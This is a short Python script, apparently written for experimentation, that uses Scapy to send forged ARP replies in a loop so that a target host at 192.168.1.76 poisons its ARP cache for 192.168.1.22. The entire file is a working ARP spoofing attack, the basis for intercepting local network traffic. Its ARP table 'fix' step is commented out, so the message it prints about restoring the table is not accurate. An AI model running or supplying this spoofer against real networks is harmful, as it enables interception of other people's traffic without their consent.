#
# ARP spoof script experimentation
#


import time
from scapy.all import *


eth_src = ''
eth_dst =''   
arp_isrc = '192.168.1.22'
arp_idst = '192.168.1.76'  
arp_hwsrc = ''
arp_hwdst = ''   

def send_arp_spoof(eth_src, eth_dst, arp_isrc, arp_idst, arp_hwsrc, arp_hwdst):
    eth = Ether(type=0x0806)
    eth.src = eth_src
    eth.dst = eth_dst

    #
    # ARP REPLY: psrc is-at hwsrc
    #

    arp = ARP(op=2)
    arp.psrc = arp_isrc
    arp.pdst = arp_idst
    arp.hwsrc = arp_hwsrc
    arp.hwdst = arp_hwdst

    sendp(eth/arp, iface='eth0', verbose=False)


try:

    while (1):

        #
        # ARP REPLY: arp_isrc is-at arp_hwsrc
        #

        send_arp_spoof(eth_src=eth_src, eth_dst=eth_dst, arp_isrc=arp_isrc, arp_idst=arp_idst, arp_hwsrc=arp_hwsrc, arp_hwdst=arp_hwdst)

        time.sleep(1)

except KeyboardInterrupt:
    print('\n-----------')
    print('\nFixing ARP table...\n')
    print('--------------\n')


    # for _ in range(5):

    #     send_arp_spoof(eth_src=eth_src, eth_dst=eth_dst, arp_isrc=arp_isrc, arp_idst=arp_idst, arp_hwsrc=arp_hwsrc, arp_hwdst=arp_hwdst
    #                     )

    #     time.sleep(0.8)

    exit()
